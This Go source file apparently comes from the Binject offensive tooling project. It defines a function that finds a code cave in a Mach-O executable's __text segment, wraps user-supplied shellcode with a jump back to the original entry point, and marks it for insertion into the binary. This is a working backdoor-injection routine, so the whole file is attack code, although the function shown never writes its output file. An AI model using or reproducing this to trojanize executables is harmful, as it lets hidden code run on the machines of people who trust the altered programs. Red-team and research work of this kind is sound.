package bj

import (
	"io/ioutil"
	"log"

	"github.com/Binject/debug/macho"
	"github.com/Binject/shellcode/api"
)

// MachoBinject - Inject shellcode into an Mach-O binary
func MachoBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {

	userShellCode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}

	//
	// BEGIN CODE CAVE DETECTION SECTION
	//
	machoFile, err := macho.Open(sourceFile)
	if err != nil {
		return err
	}
	for _, section := range machoFile.Sections {
		if section.SectionHeader.Seg == "__TEXT" && section.Name == "__text" {
			caveOffset := 0x20 /* magic value */ + machoFile.FileHeader.Cmdsz
			log.Printf("Code Cave Size: %x - %x = %x\n", section.Offset, caveOffset, section.Offset-caveOffset)
			//
			// END CODE CAVE DETECTION SECTION
			//

			shellcode := api.ApplySuffixJmpIntel64(userShellCode, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
			machoFile.Insertion = shellcode
			break
		}
	}

	return nil
}
